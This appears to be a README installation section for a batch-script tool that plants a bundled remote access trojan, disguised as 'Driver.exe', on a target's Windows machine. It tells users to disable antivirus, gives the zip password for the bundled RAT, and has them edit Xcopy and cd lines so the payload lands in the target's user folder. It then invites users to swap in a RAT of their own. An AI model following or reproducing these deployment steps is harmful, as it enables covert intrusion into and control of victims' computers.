### Installation (Fast no GUI)

Becuase you are dealing with rats make sure to turn off any anti virus. There is a existing rat already inside the $pro$ file that you will replace.

```bat
//The Password to extract the zip file is 
ratbatep1
```

Watch the poorly made tutorial video if you dont want to read wich is outdated.

Open your favorite text editing software. Look for the code:

```bat
Xcopy C:\Users\Your User\Downloads\BOI\$pro$\Driver.exe C:\Users\Your Users\
```
Change "Your User" to your targets name. Also if you are running this from a usb I will work on a code for that soon.

Also change these:

```bat
cd C:\Users\Your User\
```
There are more than one so look out for them.

Also delete the REM comments becuase they effct your code.

If you want the raw code I will shortly release it after it is perfected.
For now just use the raw code from me repertory.

Now "save as" the code as installer.bat. You do not need to change the 
Save File Type as since we already put a atribute. The delete the installer.txt file.


Make your own rat wich I will be makinga youtube tutorial on soon called Driver.exe and replace the existing one. Done! I it doesn't work make a pull request so I can look into it.
